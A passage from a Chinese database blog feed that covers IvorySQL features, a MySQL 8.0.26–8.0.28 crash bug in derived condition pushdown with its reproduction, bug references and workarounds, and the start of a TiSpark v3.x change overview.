<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pg_catalog.pg_package;</span><br><span class="line">  oid  <span class="operator">|</span> pkgname <span class="operator">|</span> pkgnamespace <span class="operator">|</span> pkgowner <span class="operator">|</span> pkgsecdef <span class="operator">|</span>                              pkgspec                              <span class="operator">|</span> pkgbody <span class="operator">|</span> pkgaccessor <span class="operator">|</span> pkgacl</span><br><span class="line"><span class="comment">-------+---------+--------------+----------+-----------+-------------------------------------------------------------------+---------+-------------+--------</span></span><br><span class="line"> <span class="number">19041</span> <span class="operator">|</span> mybooks <span class="operator">|</span>         <span class="number">2200</span> <span class="operator">|</span>       <span class="number">10</span> <span class="operator">|</span> t         <span class="operator">|</span> <span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE PACKAGE mybooks <span class="keyword">AS</span>                             <span class="operator">+</span><span class="operator">|</span>         <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line">       <span class="operator">|</span>         <span class="operator">|</span>              <span class="operator">|</span>          <span class="operator">|</span>           <span class="operator">|</span>     <span class="keyword">CURSOR</span>      booksinfo <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> BOOKS;                <span class="operator">+</span><span class="operator">|</span>         <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line">       <span class="operator">|</span>         <span class="operator">|</span>              <span class="operator">|</span>          <span class="operator">|</span>           <span class="operator">|</span>                                                                  <span class="operator">+</span><span class="operator">|</span>         <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line">       <span class="operator">|</span>         <span class="operator">|</span>              <span class="operator">|</span>          <span class="operator">|</span>           <span class="operator">|</span>     <span class="keyword">PROCEDURE</span> list_books;                                        <span class="operator">+</span><span class="operator">|</span>         <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line">       <span class="operator">|</span>         <span class="operator">|</span>              <span class="operator">|</span>          <span class="operator">|</span>           <span class="operator">|</span>     <span class="keyword">FUNCTION</span> add_book(title VARCHAR2(<span class="number">100</span>), author VARCHAR2(<span class="number">100</span>), <span class="operator">+</span><span class="operator">|</span>         <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line">       <span class="operator">|</span>         <span class="operator">|</span>              <span class="operator">|</span>          <span class="operator">|</span>           <span class="operator">|</span>          price NUMBER) <span class="keyword">RETURN</span> bool;                              <span class="operator">+</span><span class="operator">|</span>         <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line">       <span class="operator">|</span>         <span class="operator">|</span>              <span class="operator">|</span>          <span class="operator">|</span>           <span class="operator">|</span>     <span class="keyword">PROCEDURE</span> remove_book(book_title VARCHAR2(<span class="number">100</span>));             <span class="operator">+</span><span class="operator">|</span>         <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line">       <span class="operator">|</span>         <span class="operator">|</span>              <span class="operator">|</span>          <span class="operator">|</span>           <span class="operator">|</span> <span class="keyword">END</span>                                                               <span class="operator">|</span>         <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<h3 id="IvorySQL-全局唯一索引-Global-Unique-Index">IvorySQL: 全局唯一索引 (Global Unique Index)</h3>
<p>IvorySQL 支持在分区表上创建跨分区的唯一性检查，索引创建成功后，在插入或者更改数据时，如果有重复值将报错。可用于对非分区键的其他列做唯一性检查。举例如下：</p>
<ul>
<li>PG</li>
</ul>
<p>可以正常创建分区表，但不支持 <code>global</code> 语法，也无法只对 <code>v</code> 列创建唯一索引，因为它不是分区键。</p>
<img  alt="ivoryglobalindexpg1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230727-0b475df8-f899-4fa4-9dce-32cfe8838d3a.png"
                      referrerpolicy="no-referrer"
                >
<p>只能在分区键 <code>d</code> 列创建分区索引 <code>idx_g_u</code>。所有测试数据均可写入，但可以看到 <code>v</code> 列存在重复值。</p>
<img  alt="ivoryglobalindexpg2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230727-68f0a2cf-f399-4f31-9508-20e30a4006f6.png"
                      referrerpolicy="no-referrer"
                >
<ul>
<li>IvorySQL</li>
</ul>
<p>可以正常创建分区表，以及全局唯一索引 <code>idx_g_u</code>。</p>
<img  alt="ivoryglobalindexIvory1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230727-c0aac6a5-4663-43b0-8541-1b9cd9353b18.png"
                      referrerpolicy="no-referrer"
                >
<p>接下来写入测试数据，第一部分正常写入，第二部分报错，提示重复的值违反唯一约束。查询表 <code>tpg</code> 中的数据，发现只有第一部分测试数据写入成功。</p>
<img  alt="ivoryglobalindexIvory2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230727-ee6488bf-360b-4ecc-9307-e4d388576b2c.png"
                      referrerpolicy="no-referrer"
                >
<p>注：</p>
<p>在本例中，<code>relkind</code> 表示对象类型，<code>relkind</code> 的三个取值含义分别为：<code>i</code> 表示索引 (index)，<code>I</code> 表示分区索引 (partitioned index)，<code>g</code> 表示全局索引 (global index)。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># \dt<span class="operator">+</span> pg_class</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> QUERY <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line"><span class="keyword">SELECT</span> n.nspname <span class="keyword">as</span> &quot;Schema&quot;,</span><br><span class="line">  c.relname <span class="keyword">as</span> &quot;Name&quot;,</span><br><span class="line">  <span class="keyword">CASE</span> c.relkind <span class="keyword">WHEN</span> <span class="string">&#x27;r&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;table&#x27;</span> <span class="keyword">WHEN</span> <span class="string">&#x27;v&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;view&#x27;</span> <span class="keyword">WHEN</span> <span class="string">&#x27;m&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;materialized view&#x27;</span> <span class="keyword">WHEN</span> <span class="string">&#x27;i&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;index&#x27;</span> <span class="keyword">WHEN</span> <span class="string">&#x27;g&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;global index&#x27;</span> <span class="keyword">WHEN</span> <span class="string">&#x27;S&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;sequence&#x27;</span> <span class="keyword">WHEN</span> <span class="string">&#x27;t&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;TOAST table&#x27;</span> <span class="keyword">WHEN</span> <span class="string">&#x27;f&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;foreign table&#x27;</span> <span class="keyword">WHEN</span> <span class="string">&#x27;p&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;partitioned table&#x27;</span> <span class="keyword">WHEN</span> <span class="string">&#x27;I&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;partitioned index&#x27;</span> <span class="keyword">END</span> <span class="keyword">as</span> &quot;Type&quot;,</span><br><span class="line">  pg_catalog.pg_get_userbyid(c.relowner) <span class="keyword">as</span> &quot;Owner&quot;,</span><br><span class="line">  <span class="keyword">CASE</span> c.relpersistence <span class="keyword">WHEN</span> <span class="string">&#x27;p&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;permanent&#x27;</span> <span class="keyword">WHEN</span> <span class="string">&#x27;t&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;temporary&#x27;</span> <span class="keyword">WHEN</span> <span class="string">&#x27;u&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;unlogged&#x27;</span> <span class="keyword">END</span> <span class="keyword">as</span> &quot;Persistence&quot;,</span><br><span class="line">  am.amname <span class="keyword">as</span> &quot;Access method&quot;,</span><br><span class="line">  pg_catalog.pg_size_pretty(pg_catalog.pg_table_size(c.oid)) <span class="keyword">as</span> &quot;Size&quot;,</span><br><span class="line">  pg_catalog.obj_description(c.oid, <span class="string">&#x27;pg_class&#x27;</span>) <span class="keyword">as</span> &quot;Description&quot;</span><br><span class="line"><span class="keyword">FROM</span> pg_catalog.pg_class c</span><br><span class="line">     <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> pg_catalog.pg_namespace n <span class="keyword">ON</span> n.oid <span class="operator">=</span> c.relnamespace</span><br><span class="line">     <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> pg_catalog.pg_am am <span class="keyword">ON</span> am.oid <span class="operator">=</span> c.relam</span><br><span class="line"><span class="keyword">WHERE</span> c.relkind <span class="keyword">IN</span> (<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">AND</span> c.relname OPERATOR(pg_catalog.<span class="operator">~</span>) <span class="string">&#x27;^(pg_class)$&#x27;</span> <span class="keyword">COLLATE</span> pg_catalog.default</span><br><span class="line">  <span class="keyword">AND</span> pg_catalog.pg_table_is_visible(c.oid)</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line"></span><br><span class="line">                                       List <span class="keyword">of</span> relations</span><br><span class="line">   Schema   <span class="operator">|</span>   Name   <span class="operator">|</span> Type  <span class="operator">|</span>  Owner   <span class="operator">|</span> Persistence <span class="operator">|</span> Access <span class="keyword">method</span> <span class="operator">|</span>  Size  <span class="operator">|</span> Description</span><br><span class="line"><span class="comment">------------+----------+-------+----------+-------------+---------------+--------+-------------</span></span><br><span class="line"> pg_catalog <span class="operator">|</span> pg_class <span class="operator">|</span> <span class="keyword">table</span> <span class="operator">|</span> ivorysql <span class="operator">|</span> permanent   <span class="operator">|</span> heap          <span class="operator">|</span> <span class="number">144</span> kB <span class="operator">|</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<h2 id="期待改进">期待改进</h2>
<ol>
<li>Github 上的 Release Notes 展示格式不够友好，建议调整一下，会显得更加专业。</li>
<li>最好能够搭建 IvorySQL 自己的 yum 仓库， highgo 上的信息不完全准确。</li>
<li>IvorySQL 的文档中心亟需迭代更新，建议多增加“特色”功能介绍与演示，期待新版文档站点上线。</li>
</ol>
<h2 id="The-End">The End.</h2>
<p>作为国产开源关系型数据库产品，在竞争如此激烈的竞“技”场，IvorySQL 要奋力加油啊！<br>
期待 IvorySQL 3.0 的发布，并期望带来更多“惊喜”的新特性。</p>
<h2 id="REF">REF</h2>
<ul>
<li><a class="link"   href="https://www.ivorysql.org/zh-cn/" >IvorySQL 官方主页 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/u/471017" >IvorySQL 的个人主页 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/1684535632080216064" >https://www.modb.pro/db/1684535632080216064 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>IvorySQL</category>
      </categories>
      <tags>
        <tag>postgresql</tag>
        <tag>postgresql 15</tag>
        <tag>ivorysql</tag>
        <tag>highgo</tag>
        <tag>orafce</tag>
      </tags>
  </entry>
  <entry>
    <title>再遇 MySQL “一招必杀” Bug</title>
    <url>/2023/mysql/mysql-8.0.26-bug-crash/</url>
    <content><![CDATA[<h2 id="TL-DR">TL;DR</h2>
<p>该 Bug 与 <a class="link"   href="https://dev.mysql.com/doc/refman/8.0/en/derived-condition-pushdown-optimization.html" >Derived Condition Pushdown Optimization <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 相关，从 MySQL 8.0.26 引入，8.0.27 和 8.0.28 仍受影响，直到 MySQL 8.0.29 被修复。<br>
但是，MySQL 8.0.29 有其他致命缺陷，官网已经移除下载链接，建议升级到新版本 MySQL 8.0.33 或 MySQL 8.0.34。</p>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230725-b8b3c862-8a54-40e9-b90f-5f215e9e3161.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230725-afb101f2-7b35-426c-bd73-0919cf7ca243.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="问题现象">问题现象</h2>
<p>该问题是 vx 群里的好友发现的，在 MySQL 5.7、TiDB 中并未发现该问题，但当应用程序运行在 MySQL 8.0.27 时，问题出现，最终定位到具体 SQL，并提炼出最小化复现步骤，诱发问题的 SQL 如下。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">FROM</span> (</span><br><span class="line">  <span class="keyword">SELECT</span> bb.c_int<span class="operator">+</span><span class="number">1</span> <span class="keyword">AS</span> c_int111</span><br><span class="line">  <span class="keyword">FROM</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> aa.c_int <span class="keyword">AS</span> c_int</span><br><span class="line">    <span class="keyword">FROM</span> (</span><br><span class="line">      <span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">AS</span> c_int</span><br><span class="line">    ) aa</span><br><span class="line">  ) bb</span><br><span class="line">) cc</span><br><span class="line"><span class="keyword">WHERE</span> c_int111 <span class="operator">&gt;</span> <span class="number">1</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure></div>
<p>经过多版本实验比对，发现该 SQL 在较低版本（8.0.25 及以下）或较高版本（8.0.29 及以上）的 MySQL 中执行正常，在<a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/mysql-compatibility" >兼容 MySQL 5.7 协议的 TiDB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中执行正常，在 MariaDB 中也执行正常。</p>
<img  alt="3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230725-c916c471-6aee-4cd9-9e09-ecb919503d3a.png"
                      referrerpolicy="no-referrer"
                >
<p>但是在 MySQL 8.0.27 / 8.0.28 中，该 SQL 执行异常。</p>
<img  alt="4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230725-f81193e2-9d7a-4a8f-b83d-37a469c8b6e0.png"
                      referrerpolicy="no-referrer"
                >
<p>But again, 在 MySQL 8.0.26 中，该 SQL 将导致 DB Crash，“一招致命”。</p>
<img  alt="5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230725-a70f417e-529d-460f-b294-d361a9a275d1.png"
                      referrerpolicy="no-referrer"
                >
<p>到此，可以确定，这是 MySQL 8.0.26 的一个 Bug，并对 MySQL 8.0.27 和 8.0.28 持续产生影响，直到 MySQL 8.0.29 被完整修复，恢复可用态。</p>
<h2 id="Bug-确认">Bug 确认</h2>
<p>知道了 Bug 影响和被修复的版本，以及 crash log 就降低了寻找 Bug 号的难度。<br>
对于 MySQL 社区版，除了搜索引擎，通常有三个途径可以用来找寻 Bug 号，分别是 MySQL 官网的 Release Notes，MySQL Bug 系统，以及 MySQL 社区版源码。</p>
<p>对于此案例，可以通过错误日志来快速定位，摘取重要日志如下。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">/usr/sbin/mysqld(Condition_pushdown::replace_columns_in_cond(Item**, <span class="type">bool</span>)+<span class="number">0x74</span>) [<span class="number">0x55715b87c6e4</span>]</span><br><span class="line">/usr/sbin/mysqld(Condition_pushdown::make_cond_for_derived()+<span class="number">0x2a3</span>) [<span class="number">0x55715b87d7f3</span>]</span><br><span class="line">/usr/sbin/mysqld(Query_block::push_conditions_to_derived_tables(THD*)+<span class="number">0xda</span>) [<span class="number">0x558385bda21a</span>]</span><br><span class="line">/usr/sbin/mysqld(Query_block::prepare(THD*, mem_root_deque&lt;Item*&gt;*)+<span class="number">0xd7c</span>) [<span class="number">0x558385bef7fc</span>]</span><br></pre></td></tr></table></figure></div>
<p>简单解释上面四个方法的含义：</p>
<ol>
<li><code>Condition_pushdown::replace_columns_in_cond</code>:<br>
用派生表表达式替换将推入此派生表的条件中的列。</li>
<li><code>Condition_pushdown::make_cond_for_derived</code>：创建一个可以下推到派生表的条件，并将其下推。</li>
<li><code>Query_block::push_conditions_to_derived_tables</code>：将此查询块的WHERE条件的部分推送到物化派生表。</li>
<li><code>Query_block::prepare</code>：准备查询块进行优化。解析表和列信息。</li>
</ol>
<p>在公开的 Bug 系统中找到了一条记录 (Bug #104574)，S2 严重级别。</p>
<img  alt="6.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230725-601c8f58-ead6-49cc-97b9-3ee368835db5.png"
                      referrerpolicy="no-referrer"
                >
<p>与之对应的 commit 记录为：<a class="link"   href="https://github.com/mysql/mysql-server/commit/518c2ae85b55f78565908567a02de55d0a8a477a" >518c2ae85b55f78565908567a02de55d0a8a477a <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Bug#33197276: regression: Assertion `cur_query_block != select&#x27; failed.</span><br><span class="line">and segfault in Condition_pushdown::replace_columns_in_cond</span><br><span class="line">Bug#33209907: condition seems not correct</span><br></pre></td></tr></table></figure></div>
<p>继续排查 <a href="https://github.com/mysql/mysql-server/commits/mysql-8.0.29/sql/sql_derived.cc"><code>sql_derived.cc</code></a> 这个文件在 8.0.29 发版之前的提交信息，找到可能与之相关的 commit 记录。</p>
<p>顺藤摸瓜，找到了 MySQL 8.0.29 修复的那条 commit 记录 (3ca1c67dfdbc9e2972810773474fbfe70fdabaa8)。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WL#13730 - Condition pushdown to materialized derived tables</span><br><span class="line">with set operations</span><br></pre></td></tr></table></figure></div>
<p>回头再看 Release Notes，可以找到如下记录：</p>
<blockquote>
<p>MySQL 8.0.27<br>
In certain cases, the view reference cloned when pushing a condition down to a derived table was not always resolved in the desired context. In addition, a check for a null condition was not performed correctly. (Bug #104574, Bug #33209907, Bug #33197276)</p>
<p>MySQL 8.0.29<br>
The derived materialized table condition pushdown optimization can now be used with most unions. This means that an outer WHERE condition can now be pushed down to every query block of the query expression of the materialized derived table or view.<br>
…<br>
This can now be done for most UNION queries. For exceptions, and additional information, see Derived Condition Pushdown Optimization. (Bug #24012, Bug #36802, Bug #106006, Bug #11746156, Bug #11748590, Bug #13650627, Bug #30587347, Bug #33318096, Bug #33738597, WL #13730)</p>
</blockquote>
<p>到此，可以初步判定，这个 Bug 是由 MySQL 8.0.22 新引入的变量 <code>derived_condition_pushdown</code> 及其相关代码逻辑处理不恰引起的。</p>
<h2 id="解决办法">解决办法</h2>
<p>找到原因，解决起来就很简单了。</p>
<ol>
<li>(workaround) 参数 <code>derived_condition_pushdown</code> 默认值为 ON，修改全局变量将其改为 OFF，并将其进行持久化设定。</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> optimizer_switch<span class="operator">=</span><span class="string">&#x27;...,derived_condition_pushdown=off&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> PERSIST optimizer_switch<span class="operator">=</span><span class="string">&#x27;...,derived_condition_pushdown=off&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
<img  alt="7.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230725-0b1db1ce-3f27-46b3-ac96-67ca59a09737.png"
                      referrerpolicy="no-referrer"
                >
<ol start="2">
<li>跳过问题版本，升级到更高版本，如 MySQL 8.0.33 或 MySQL 8.0.34。</li>
</ol>
<p>Ps.</p>
<p>在查阅资料过程中，发现在新版本还有关于 <code>derived_condition_pushdown</code> 的 Bug，比如 <a class="link"   href="https://bugs.mysql.com/bug.php?id=109699" >Bug#109699 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> , <a class="link"   href="https://bugs.mysql.com/bug.php?id=110228" >Bug#110228 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 影响到 MySQL 8.0.32，在 MySQL 8.0.33 得到修复。看来这还是个有故事的 feature。</p>
<h2 id="总结">总结</h2>
<p>在修复一个 Bug 时，可能引入新的 Bug，所以功能测试、版本适配很重要。<br>
DBA 需要有不同版本、不同架构，甚至不同类型数据库的测试环境，用来测试或验证各种概念、问题。<br>
没想到一个新特性影响了那么多版本，希望 <a class="link"   href="https://dev.mysql.com/doc/refman/8.1/en/" >MySQL 8.1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 之后会带来不一样的感受~</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 8.0</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>mysql 8.0</tag>
        <tag>sql优化</tag>
        <tag>bug</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB 7.1.0 LTS 特性解读 | 浅析 TiSpark v3.x 新变化</title>
    <url>/2023/tidb/tidb-7.1-tispark-3.x/</url>
    <content><![CDATA[<img  alt="tidb-7.x-new-feature-banner.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/tidb-7.x-new-feature-banner-1696249336706.png"
                      referrerpolicy="no-referrer"
                >
<p><a class="link"   href="https://tidb.net/book/book-rush" >TiDB 6.x in Action <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 已经发布一年了，去年撰写的 <a class="link"   href="https://tidb.net/book/book-rush/best-practice/tispark-practice/" >TiSpark 实践 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 文章便有一篇收录其中，一年时间过去了，TiSpark 版本也从当时的 v3.0.0 升到了现在的 v3.2.2，本文将综合浅析这些版本带来的诸多变化。</p>
<img  alt="02.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/02-1690214631542.png"
                      referrerpolicy="no-referrer"
                >
图 -- TiSpark v3.x New Feature Mind Map
<h2 id="发版时间表">发版时间表</h2>
<p>从去年六月至今，TiSpark v3.x 系列已经发布了 11 个版本。目前，最新版本为 TiSpark v3.2.2。从 TiSpark 3.0 开始，全部使用 Scala 2.12 (2.12.10) 版本，不再支持 Scala 2.11。具体各版本的发版时间参见下表。</p>
<img  alt="03.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/03-1690214637246.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="TiSpark-新变化">TiSpark 新变化</h2>
<h3 id="Spark-兼容性">Spark 兼容性</h3>
<p>从 TiSpark 3.1 开始，支持 Spark 3.0 ~ 3.3。不过各个小版本对 Spark 的依赖还是有略微区别，主要在于 Spark 的版本升级和安全威胁 (Vulnerabilities) 解决情况。具体信息参加下表。</p>
<img  alt="04.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/04-1690214643114.png"
                      referrerpolicy="no-referrer"
                >
<p>对比最新 Spark 的 Release 和 Vulnerability 信息，笔者推测近期 TiSpark 或将支持 Spark v3.4.1 及 Scala 2.13.x，并升级大版本号到 TiSpark v3.3.x。</p>
<img  alt="05.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/05-1690214648656.png"
                      referrerpolicy="no-referrer"
                >
<p>需要注意的是，在开始使用 TiSpark 之前，建议检查各组件的版本匹配情况，例如，目前尚不建议使用更高版本的 Scala 和 Spark，不然或可看到如下报错信息。(<a class="link"   href="https://asktug.com/t/topic/1009677" >1009677 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:~/spark-3.3.2-bin-hadoop3-scala2.13/conf$ pyspark</span><br><span class="line">Python 3.6.8 (default, Nov 16 2020, 16:55:22)</span><br><span class="line">[GCC 4.8.5 20150623 (Red Hat 4.8.5-44)] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">Setting default log level to &quot;WARN&quot;.</span><br><span class="line">To adjust logging level use sc.setLogLevel(newLevel). For SparkR, use setLogLevel(newLevel).</span><br><span class="line">23/07/18 17:18:15 WARN NativeCodeLoader: Unable to load native-hadoop library for your platform... using builtin-java classes where applicable</span><br><span class="line">23/07/18 17:18:16 WARN SparkSession: Cannot use org.apache.spark.sql.TiExtensions to configure session extensions.</span><br><span class="line">java.lang.NoClassDefFoundError: Could not initialize class com.pingcap.tispark.TiSparkInfo$</span><br><span class="line">        at org.apache.spark.sql.TiExtensions.apply(TiExtensions.scala:39)</span><br><span class="line">        at org.apache.spark.sql.TiExtensions.apply(TiExtensions.scala:35)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<h3 id="Jar-包命名">Jar 包命名</h3>
<p>从 TiSpark v3.0.0 (<a class="link"   href="https://github.com/pingcap/tispark/pull/2370" >#2370 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) 开始，对 TiSpark Jar 包的命名格式做了调整，更加规范，也便于选择。</p>
<p>// 题外话，放心地直接选择最新版本的 TiSpark 就好了。</p>
<p>变更后的格式为 <code>tispark-assembly-$&#123;spark.version.release&#125;_$&#123;scala.version.release&#125;</code>，例如 <code>tispark-assembly-3.3_2.12-3.2.2.jar</code> 表示 TiSpark v3.2.2 版本，支持 Spark v3.3.x，使用 Scala 2.12.x。</p>
<h3 id="Jar-包大小-tikv-client-java">Jar 包大小 &amp; tikv-client-java</h3>
<p>在查看 TiSpark 的 Release Notes 过程中发现，Assets 里 TiSpark v3.1.3 的 Jar 包大小还是 34 M，但是 v3.2.0 的 Jar 包大小已经变成了 50 M，关于此问题还开贴记录了一下 <a class="link"   href="https://asktug.com/t/topic/1008839" >tispark package size 问题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。<br>
后来倒推了一下 commit 记录，发现了对应的 PR <a class="link"   href="https://github.com/pingcap/tispark/pull/2491" >[GSOC2022]REFACTOR—Normalize pdclient to client-java #2491 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。又仔细盘点 Release Notes 才发现与之对应的记录。</p>
<blockquote>
<p>v3.2.2: uprade client-java version to 3.3.5 to fix fail to query from TiFlash in (#2715) by @ti-chi-bot in #2716<br>
v3.2.1: update client-java version to 3.3.4 (#2695) by @ti-chi-bot in #2696<br>
v3.2.0: Normalize the Java client in TiSpark and use the official client-java #2491</p>
</blockquote>
<p>也就是说，TiSpark 从 v3.2 开始，直接引入了完整的 <a class="link"   href="https://github.com/tikv/client-java" >client-java <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 作为依赖，而且在 TiSpark v3.2.2 中使用的是最新版本 TiKV client-java <a class="link"   href="https://github.com/tikv/client-java/releases/tag/v3.3.5" >v3.3.5 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
关于这项变更，在代码的设计文档里有专门说明：<a class="link"   href="https://github.com/pingcap/tispark/blob/master/docs/design/2022-08-11-normalize-client.md" >2022-08-11-normalize-client <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="mysql-connector-java">mysql-connector-java</h3>
<p>与 tikv-client-java 的情况相反，由于 mysql-connector-java 所使用的 License (GPLv2) 的特殊性 ，被从 TiSpark 的依赖中移除了，使用时需要自行导入。<br>
以本文为例，<code>mysql-connector-j.jar</code> 放在 <code>~/spark-3.3.1-bin-hadoop2/jars</code> 路径下。</p>
<blockquote>
